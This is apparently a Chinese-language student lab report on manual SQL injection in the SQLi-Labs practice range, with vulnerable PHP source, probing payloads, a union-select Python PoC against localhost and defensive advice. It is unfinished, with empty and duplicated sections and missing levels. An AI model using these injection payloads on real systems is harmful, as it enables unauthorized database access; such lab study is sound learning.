

# SQLi-Labs 手工打靶报告

> 作者：吴圳宇  
> 日期：2025 年 10 月  
> 项目地址：[https://github.com/litt1eYu/sqlilabs-report](https://github.com/litt1eYu/sqlilabs-report)

---

## 目录

- [项目简介](#项目简介)
- [环境说明](#环境说明)
- [测试目标](#测试目标)
- [关卡记录](#关卡记录)
  - [Less-1 手工注入分析](#less-1-手工注入分析)
  - [Less-2 手工注入分析](#less-2-手工注入分析)
  - ...
  - [Less-20 手工注入分析](#less-20-手工注入分析)
- [总结与思考](#总结与思考)
- [附录](#附录)

---

## 项目简介

SQLi-Labs 是一个经典的 SQL 注入靶场，用于学习与测试 SQL 注入漏洞的形成原理、利用方式与防御方法。  
本报告记录了本人在 SQLi-Labs 靶场中手工打靶的全过程，包括：
- 漏洞点分析与利用；
- 可运行的 PoC；
- 攻击与防御验证截图；
- 对应防御措施。

---

## 环境说明

| 项目     | 说明                  |
| -------- | --------------------- |
| PHP 版本 | 5.4.45                |
| 数据库   | MySQL 5.7.26          |
| 运行环境 | 本地 / phpstudy(小皮) |
| 浏览器   | Firefox + BurpSuite   |
| 截图工具 | Typora + PrtSc        |

---

## 测试目标

- 手工分析 SQL 注入点与过滤机制；
- 提取有效 payload；
- 复现漏洞利用过程；
- 编写 PoC 脚本并验证；
- 总结漏洞防御思路。

---

## 关卡记录

### Less-1 手工注入分析

#### 1. 源码分析
```php+HTML
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo "<font size='5' color= '#99FF00'>";
  	echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	print_r(mysql_error());
	echo "</font>";  
	}
```

- 代码理解

  LIMIT 0，1 

  第一个参数0：从表users中的第0行开始查询

  第二个参数1：从查询结果中获取第一行结果（按照id先后）

  由于数据库中id一般不会重复，所以LIMIT m,n中不论n多大结果也只有一行，只有m会影响查询的范围。

  $result：结果集（resource 类型）一个“临时表”，存放了查询得到的所有行。

  （在这里结果集只会有一行）

  $row：根据表生成的多维数组

  如果结果集有多组数据，那调用数组不就变成二维了吗？

  因为：mysql_fetch_array() 每调用一次从结果集中取一行（假定结果集有多行，实现全部读取需多次或循环调用）

- ```php+HTML
  echo 'Your Login name:'. $row['username'];
  ```

  将从数据库查询到的用户名拼接到字符串并输出到页面。

  这代表着存在信息回显

- ```php+HTML
  print_r(mysql_error());
  ```

  将最近一次 MySQL 操作的错误信息（如果有）以可读形式输出到页面。

  这代表着可利用详细的错误信息进行报错注入

#### 2. 注入点确认

- 参数位置：`id`

- 参数类型：字符串型注入

- 初始测试：

  ​	?id=1 		 	查询成功

  ​	?id=1' 			报错

  ​	?id=1’ -- s	   	查询成功

  ​	?id=1’ and 1=1  	查询成功

  ​	?id=1’ and 1=2  	报错

  ​	可确定为单引号字符型

#### 3. 漏洞利用

- 判断回显数组列数

  ```
  /sqlilabs/Less-1/?id=1' order by 1 --+
  ```

  ![](/assets/images/1-2.png)

  ```
  /sqlilabs/Less-1/?id=1' order by 2 --+
  ```

  ![](/assets/images/1-3.png)

  ```
  /sqlilabs/Less-1/?id=1' order by 3 --+
  ```

  ![](/assets/images/1-4.png)

  ```
  /sqlilabs/Less-1/?id=1' order by 4 --+
  ```

​	![](/assets/images/1-5.png)



- 判断回显数组列数

  ```
  /sqlilabs/Less-1/?id=1' order by 1 --+
  ```

  ![](/assets/images/1-3.png)

  ```
  /sqlilabs/Less-1/?id=1' order by 2 --+
  ```

  ![](/assets/images/1-3.png)

  ```
  /sqlilabs/Less-1/?id=1' order by 3 --+
  ```

  ![](/assets/images/1-3.png)

  ```
  /sqlilabs/Less-1/?id=1' order by 4 --+
  ```

- 枚举数据库：

  ```
  
  ```

  

- 枚举数据库：

- 枚举数据库：

- 枚举数据库：

- 枚举数据库：

- 枚举数据库：

- 枚举数据库：

#### 4. PoC 代码

```python
import requests

url = "http://127.0.0.1/Less-1/"
payload = "?id=-1' union select 1,2,database()--+"
r = requests.get(url + payload)
print(r.text)
```

#### 5. 实验截图

（此处插入截图示例）

```
![less1-success](images/less1-success.png)
```

#### 6. 防御建议

- 使用 **预编译语句 (Prepared Statements)**；
- 使用 **mysqli_real_escape_string()**；
- 对输入进行 **白名单验证**。







## 总结与思考

1. 从 Less-1 到 Less-20，SQLi-Labs 涵盖了多种注入类型：
   - 数字型 / 字符型 / 搜索型；
   - POST 注入 / Header 注入 / Cookie 注入；
   - 盲注（基于布尔、时间、报错）；
   - 二次注入。
2. 对每种注入类型，重点应掌握：
   - 请求方式；
   - 回显特征；
   - 过滤与绕过；
   - 利用与修复思路。

## 附录

- [SQLi 常见 Payload 字典](#)
- [ASCII 可打印字符表](#)
- [工具命令参考](#)